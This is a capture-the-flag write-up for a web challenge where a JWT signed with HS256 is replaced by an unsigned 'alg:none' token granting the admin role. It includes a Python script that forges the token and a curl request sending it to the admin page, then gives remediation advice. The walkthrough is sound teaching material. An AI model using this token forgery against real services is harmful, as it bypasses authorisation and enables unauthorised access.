Walkthrough

Challenge Description

We are given a web application at https://lt560zwl9uv6.boroctf.com. Upon logging in, we are assigned the role of guest and denied access to the /admin page. The goal is to escalate privileges and reach the admin panel.

Reconnaissance

After logging in with the credentials, intercepting the HTTP traffic revealed a token cookie being sent with every request:

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6Imd1ZXN0In0.e_KzHS9x0fDAOX77fCPr5RI19eLIipG-OTv4TQ9Vr9w

Decoding the JWT (JSON Web Token) reveals:

Header:

{
"alg": "HS256",
"typ": "JWT"
}

Payload:

{
"username": "jj",
"role": "guest"
}

The role field controls access. We need to change it to admin.

Vulnerability — JWT alg:none

JWT supports an alg field in the header that tells the server which algorithm to use to verify the signature. One valid (but dangerous) value is "none", which means no signature is required.

A misconfigured server that accepts alg: none will skip signature verification entirely — trusting whatever is in the payload without checking its integrity.

Exploitation

Step 1 — Craft the malicious JWT

We build a new JWT with:

alg set to none

role changed from guest to admin

An empty signature (just a trailing .)

import base64
header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(b'{"username":"jj","role":"admin"}').rstrip(b'=').decode()
token = f"{header}.{payload}."
print(token)
Output:

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6ImFkbWluIn0.

Step 2 — Send the forged token

curl -s -k \
-H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6ImFkbWluIn0." \

https://lt560zwl9uv6.boroctf.com/admin

Step 3 — Access Granted 🎉

The server accepted the unsigned token and returned the admin panel with the flag:

boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}

Root Cause

The server failed to reject JWTs with "alg":"none". This means it performed no cryptographic verification on the token, allowing any user to forge arbitrary claims (such as "role":"admin") without knowing the secret key.

Remediation

Reject alg:none explicitly on the server side.

Whitelist allowed algorithms — never trust the alg field from the token itself.

Use a well-maintained JWT library that handles this by default (e.g., python-jose, jsonwebtoken with explicit algorithm pinning).

Lessons Learned

  • Never trust the alg value supplied by an attacker-controlled token.
  • JWT verification must pin allowed algorithms server-side.
  • Simple cookie inspection can reveal authorization logic.
